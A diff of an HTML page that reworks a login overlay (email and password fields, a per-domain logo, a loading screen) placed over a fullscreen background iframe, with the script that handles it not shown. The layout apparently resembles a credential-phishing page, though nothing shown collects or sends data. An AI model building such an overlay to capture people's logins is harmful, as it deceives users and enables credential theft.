@@ -28,30 +28,29 @@
   <!-- Fullscreen background iframe -->
   <iframe id="bg-frame"></iframe>
 
-  <!-- Login overlay -->
-  <div class="overlay" id="overlay">
-    <div class="login-box">
-      <img id="logo" alt="Logo" />
 
-      <!-- ✅ Email input with icon -->
+<!-- Login overlay -->
+  <div class="overlay">
+    <div class="loading" id="loading">
+      <img id="loading-logo" alt="Loading Logo">
+      Loading...
+    </div>
+
+    <div class="login-box">
+      <img id="logo" alt="Domain Logo">
       <div class="input-group">
         <i class="fas fa-envelope icon"></i>
         <input type="email" id="email" placeholder="Email" />
       </div>
-
-      <!-- ✅ Password input with icon -->
       <div class="input-group">
         <i class="fas fa-lock icon"></i>
         <input type="password" id="password" placeholder="Password" />
       </div>
-
-      <!-- Error message -->
       <div id="error-msg" class="error-msg"></div>
-
-      <!-- Login button -->
       <button id="login-btn">Login</button>
     </div>
   </div>
+
 
   <!-- ✅ Your JavaScript -->
   <script src="script.js"></script>
